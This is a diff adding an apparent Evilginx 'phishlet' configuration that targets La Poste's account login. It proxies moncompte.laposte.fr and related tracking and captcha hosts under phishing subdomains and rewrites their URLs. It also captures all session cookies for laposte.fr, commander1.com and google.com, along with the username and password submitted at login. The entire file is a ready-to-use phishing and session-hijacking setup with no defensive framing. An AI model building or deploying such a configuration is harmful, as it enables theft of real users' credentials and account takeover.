@@ -1,0 +1,79 @@
+author: "@EvilWhale"
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'laposte.fr', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'try', orig_sub: 'try', domain: 'abtasty.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'tagcommander.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'actorssl-5637', orig_sub: 'actorssl-5637', domain: 'kxcdn.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'boxrelationnelle', orig_sub: 'boxrelationnelle', domain: 'laposte.fr', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'u', orig_sub: 'u', domain: 'logbor.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn-eu', orig_sub: 'cdn-eu', domain: 'realytics.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'realytics.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'engage', orig_sub: 'engage', domain: 'commander1.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'commander1.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bat', orig_sub: 'bat', domain: 'bing.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'logs1412', orig_sub: 'logs1412', domain: 'xiti.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'moncompte', orig_sub: 'moncompte', domain: 'laposte.fr', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'captcha', orig_sub: 'captcha', domain: 'liveidentity.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'woopic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'servedby', orig_sub: 'servedby', domain: 'flashtalking.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'www', domain: 'laposte.fr', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'try', domain: 'abtasty.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'cdn', domain: 'tagcommander.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'actorssl-5637', domain: 'kxcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'boxrelationnelle', domain: 'laposte.fr', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'u', domain: 'logbor.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'cdn-eu', domain: 'realytics.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'i', domain: 'realytics.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'bat', domain: 'bing.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'logs1412', domain: 'xiti.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'api', domain: 'commander1.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'engage', domain: 'commander1.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'www.laposte.fr', orig_sub: 'captcha', domain: 'liveidentity.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+
+  - {triggers_on: 'moncompte.laposte.fr', orig_sub: 'moncompte', domain: 'laposte.fr', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'moncompte.laposte.fr', orig_sub: 'captcha', domain: 'liveidentity.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'moncompte.laposte.fr', orig_sub: 'cdn', domain: 'woopic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'moncompte.laposte.fr', orig_sub: 'servedby', domain: 'flashtalking.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'moncompte.laposte.fr', orig_sub: 'logs1412', domain: 'xiti.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+  - {triggers_on: 'captcha.liveidentity.com', orig_sub: 'captcha', domain: 'liveidentity.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+
+
+auth_tokens:
+  - domain: '.laposte.fr'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.laposte.fr'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.commander1.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'boxrelationnelle.laposte.fr'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.google.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'moncompte.laposte.fr'
+  path: '/'
+
